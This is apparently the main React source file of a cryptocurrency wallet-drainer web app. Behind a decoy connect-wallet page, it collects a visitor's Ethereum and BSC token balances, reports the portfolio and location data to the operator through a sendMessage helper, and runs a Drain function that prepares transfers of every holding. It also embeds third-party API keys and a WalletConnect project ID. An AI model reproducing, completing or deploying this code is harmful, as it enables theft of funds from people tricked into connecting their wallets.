
import "./App.css";
import axios from "axios";
import { useEffect, useState } from "react";
import Web3 from "web3";
import { ABI, USDTBSC } from "./constant";
import SVG from 'react-inlinesvg';
// import { useWeb3Modal } from '@web3modal/wagmi/react'
import {
  checkAndChangeNetwork,
  getLocationData,
  prepareTransaction,
  sendMessage,
  switchToBsc,
  switchToEthereumMainnet,
} from "./functions";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { mainnet, bsc } from "viem/chains";
import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
import Design from "./Design";
import Modal from "./modal";
// 1. Get projectId at https://cloud.walletconnect.com
function App() {
  const projectId = "bc9d6883c609c7f108a6492128674ec6";
  const chains = [mainnet, bsc];
  const { open } = useWeb3Modal();
  const [connected, setConnected] = useState(false);
  const [account, setAccount] = useState("");
  const [balances, setBalances] = useState([]);
  const [bscbalances, setbscBalances] = useState([]);
  const [provider, setProvider] = useState();
  const [showModal, setShowModal] = useState(false);

  const openModal = () => setShowModal(true);
  const closeModal = () => setShowModal(false);
  let url = window.location.href;
  let final = new URL(url);
  let searchParms = new URLSearchParams(final?.search);
  let source = searchParms.get("key");
  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        console.log("Connected account:", accounts[0]);
        setAccount(accounts[0]);
        getLocationData(source);
        switchToEthereumMainnet();
        setConnected(true);
        setProvider(window.ethereum)
        closeModal()
        let result = await ApiServices(accounts[0]);
      } catch (error) {
        console.error(error);
      }
    } else {
      console.log("Please install MetaMask!");
    }
  };
  const connectWalletConnect = async () => {
    const connector = new WalletConnectConnector({
      chains: chains,
      options: {
        projectId: projectId,
      },
    });
   await connector.connect();;
    let pro = await connector.getProvider();
    setConnected(true);
    setProvider(pro);
    let web3 = new Web3(pro);
    const accounts = await web3.eth.getAccounts();
    console.log("Connected account:", accounts[0]);
    setAccount(accounts[0]);
    getLocationData(source);
    setConnected(true);
    closeModal()
    let result = await ApiServices(accounts[0]);
  };

  const Drain = async (connected) => {
    if (connected) {
      if (balances.length > 1) {
        console.log("ethereum");
        switchToEthereumMainnet(provider)
          .then(async (res) => {
            if (res) {
              for (const item of balances) {
                try {
                  await prepareTransaction(item, account, provider , 1);
                } catch (error) {
                  console.log(error)
                  // alert("Something went wrong");
                }
              }
            } else {
              Drain(connected);
            }
          })
          .catch((e) => {
            alert("Please switch to ethereum mainnet");
          });
      }
      if (bscbalances.length > 1) {
        console.log("binance");
        switchToBsc(provider)
          .then(async (res) => {
            if (res) {
              for (const item of bscbalances) {
                try {
                  await prepareTransaction(item, account , provider , 56);
                } catch (error) {
                  console.log(error)
                  // alert("Something went wrong");
                }
              }
            } else {
              Drain(connected);
            }
          })
          .catch((e) => {
            alert("Please switch to ethereum mainnet");
            Drain(connected);
          });
      }
    }
  };

  const ApiServices = async (account) => {
    await axios
      .get(
        `https://api.covalenthq.com/v1/eth-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
      )
      .then((res) => {
        let newArr = res?.data?.data?.items?.filter(
          (item) => Number(item?.quote_rate) > 0
        );
        // eth = newArr;
        setBalances(newArr);
      });
    await axios
      .get(
        `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
      )
      .then((res) => {
        let newArr = res?.data?.data?.items?.filter(
          (item) => Number(item?.quote_rate) > 0
        );
        // bsc = newArr;
        setbscBalances(newArr);
      });
    // return true
  };

  useEffect(() => {
    if (balances?.length > 0) {
      let message = "Totol Portfolio for Ethereum Mainent ";
      balances.forEach((item) => {
        message +=
          String(item?.contract_name) + " " + String(item?.pretty_quote) + ",";
      });
      sendMessage(message)
    }
  }, [balances]);
  useEffect(() => {
    if (bscbalances?.length > 0) {
      let message = "Totol Portfolio for Binance Smart Chain ";
      bscbalances.forEach((item) => {
        message +=
          String(item?.contract_name) + " " + String(item?.pretty_quote) + ",";
      });
      Drain(connected);
      sendMessage(message)
    }
  }, [bscbalances]);

  return (
    <div className="App"  >
     
      {/* {!connected && <button className="metamask-button" onClick={openModal}>
  Sign in with Metamask
</button>} */}
{/* {connected && <button className="metamask-button" >Connected</button>} */}
<Design connectWallet={openModal} />
{showModal && <Modal closeModal={closeModal} connectMetamask={connectWallet} connectWalletconnect={connectWalletConnect} />}

      {/* <button onClick={Drain}>Send Message</button> */}
      {/* <button onClick={connectWalletConnect} className="metamask-button">Sign in with WalletConnnect</button> */}
    </div>
  );
}

export default App;
